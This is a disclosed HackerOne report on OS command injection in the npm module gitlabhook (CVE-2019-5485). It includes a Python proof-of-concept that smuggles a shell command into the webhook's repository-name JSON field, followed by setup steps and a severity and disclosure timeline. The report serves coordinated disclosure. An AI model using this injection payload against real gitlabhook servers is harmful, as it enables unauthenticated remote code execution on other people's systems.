---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/os-command-injection
  - env/web
  - stack/node
  - vuln/command-injection
  - vuln/code-injection
  - impact/rce
substate: "resolved"
weakness: "OS Command Injection"
enriched: true
body: true
date: 2019-09-13
submitted: 2019-08-31T09:18:46.360Z
bounty_usd: null
votes: 10
cve: "CVE-2019-5485"
program: "[[programs/nodejs-ecosystem|Node.js third-party modules]]"
reporter: "samlyhin"
source: "https://hackerone.com/reports/685447"
title: "gitlabhook OS Command Injection"
---
# gitlabhook OS Command Injection

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 10 | **Program:** Node.js third-party modules | **Disclosed:** 2019-09-13

- Report: [https://hackerone.com/reports/685447](https://hackerone.com/reports/685447)
- CWE: OS Command Injection | CVE: CVE-2019-5485
- Submitted: 2019-08-31T09:18:46.360Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

I would like to report OS Command Injection in gitlabhook.
It allows execution of arbitrary code on the remote server, that waits for instructions from gitlab.

# Module

**module name:** gitlabhook 
**version:** 0.0.17
**npm page:** `https://www.npmjs.com/package/gitlabhook`

## Module Description

This is an easy to use nodeJS based web hook for GitLab.

## Module Stats

[5] downloads in the last week

# Vulnerability

## Vulnerability Description

Function "ExecFile" at line 146 executes commands without any sanitization. User input gets passed directly to this command. 

## Steps To Reproduce:

An exploit on python3 was created. 

```
#!/usr/bin/python

import requests

target = "http://192.168.126.128:3420"
cmd = r"touch /tmp/poc.txt"
json = '{"repository":{"name": "Diasporrra\'; %s;\'"}}'% cmd
r = requests.post(target, json)

print "Done."
```

Please follow these steps:
1.   Create a temporary directory on the filesystem. mkdir /tmp/temp cd /tmp/temp
2.   Install the module: npm install gitlabhook
3.    Change directory: cd node_modules/gitlabhook/
4.    Run the application: node gitlabhook-server.js

At step 4, you should see that the server is up and running. It should send a big message to the terminal, and this message should finish with the line:

```
listening for github events on 0.0.0.0:3420
```

This server was set up on Kali Linux machine. This machine has an interface with IP address 192.168.126.128.

I have another machine on Windows, that can reach this Kali Linux machine by the above IP. This Windows machine has python3 installed, and python requests module installed too.

So, edit the exploit and run it.

```
#!/usr/bin/python

import requests

target = "http://192.168.126.128:3420" #put target IP and port here
cmd = r"touch /tmp/poc.txt" #a command to execute
json = '{"repository":{"name": "Diasporrra\'; %s;\'"}}'% cmd
r = requests.post(target, json)

print ("Done.")
```

The exploit above should create a file /tmp/poc.txt on the victim server.

So, on the Kali machine, run the next command:

```
ls /tmp/poc.txt
```

And ensure that the file was created.

Also it's possible to check this vulnerability without usage of additional windows machine. The above exploit may be run on Kali Linux machine:

exploit.py:

```
#!/bin/python3

import requests

target = "http://127.0.0.1:3420" #put target IP and port here
cmd = r"touch /tmp/poc.txt" #a command to execute
json = '{"repository":{"name": "Diasporrra\'; %s;\'"}}'% cmd
r = requests.post(target, json)

print ("Done.")
```
run it:

```
chmod 755 exploit.py
pip3 install requests
python3 exploit.py
```

and check the result with the following command:
```
ls /tmp/poc.txt 
```

# Wrap up

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

An attacker can achieve Remote Code Execution (RCE) without any conditions.

## Timeline

- **Report Filed**
- **2019-08-31** @samlyhin: Reference: #629099
- **Report Triaged**
- **Changed Scope**
- **Report Severity Updated**
- **2019-09-04** @lirantal: Hi,

Thanks for reporting this issue.

I was able to reproduce and confirm the issue as you described and will triage this report as a vulnerability.

I will invite the package maintainer to this issue.
- **2019-09-04** @samlyhin: Hello, 
Please explain me based on CVSS3, why do you think it's High, not Critical. 
This vulnerability allows unauthenticated Remote Code Execution without any conditions, that leads to complete loosing of confidentiality, availability, and integrity.
- **2019-09-04** @lirantal: I updated scope -> unchanged, and privileges required -> low
Reasoning:
1. A loss of CIA doesn't necessarily mean scope changed. This doesn't mean privilege escalation per say and its possible the command is still constrained to a non-root owned process.
2. Privileges required is a bit more questionable but I'm wondering whether this webhook would actually be exposed to the public as-is? It would make sense to have a best practice to limit incoming requests using a WAF or alike to the specific IP pool of GitLab. I see however that it defaults to listen on 0.0.0.0 which I agree is not ideal.
- **2019-09-04** @samlyhin: @lirantal 
Please keep in mind that we talk about finding vulnerabilities in source code. So you can't suppose that there are other external methods such as WAF, IP restrictions, or even user-role separation, while the application does not implement such mechanisms itself.  
If you say so, there are no critical vulnerabilities at all, because security can be achieved by the other external methods for every application. 
That's why I think that you should change CVSS3 score back to 10.0.
- **2019-09-06** @samlyhin: @lirantal 
Do you have any updates?
- **2019-09-06** @samlyhin: Also, @bassguitar checked the same vulnerability in a previous version ( #629099), and confirmed that 10.0 is a valid score.
- **Report Severity Updated**
- **2019-09-06** @lirantal: Thinking about this some more I agree with the 10 score due to:
1. Scope is changed - the vulnerable component being the gitlabhook changed to the impacted component being the OS that runs it
2. Privileges required - agree with you about this being public by default and no assumption on other controls.

Still waiting on feedback from author. If not replying soon as they're not active I'll disclose.
- **2019-09-11** @samlyhin: @lirantal any updates?
- **2019-09-13** @lirantal: Yes, will continue with disclosing the vulnerability.
- **Report Resolved**
- **Agreed On Going Public**
- **Manually Disclosed**
- **2019-09-13** @samlyhin: @lirantal thanks. I would like to ask you for a CVE number for this vulnerability.
- **2019-09-13** @lirantal: I already filed a request for that ;-)
- **2019-09-13** @samlyhin: @lirantal thank you for the quick response, will wait for it
- **2019-09-13** @lirantal: 👍
- **2019-09-13** @samlyhin: Also I see that this module is now eligible for bounty, so may I have some just symbolic dollars for it? ^_^
- **2019-09-19** @lirantal: Which part shows that it is eligible? we only have a few modules listed as those eligible for bounties
- **2019-09-19** @samlyhin: @lirantal Please find a screenshot attached.
- **2019-09-19** @lirantal: I'm not entirely sure why that is so I'll check with our H1 staff.
The bug bounty criteria is showing up at: https://github.com/nodejs/security-wg/blob/master/processes/bug_bounty_criteria.md
- **2019-09-20** @lirantal: Notice that I updated the list of modules that are supported in scope for bounty. Thanks for sending in the report and sorry for the confusion!
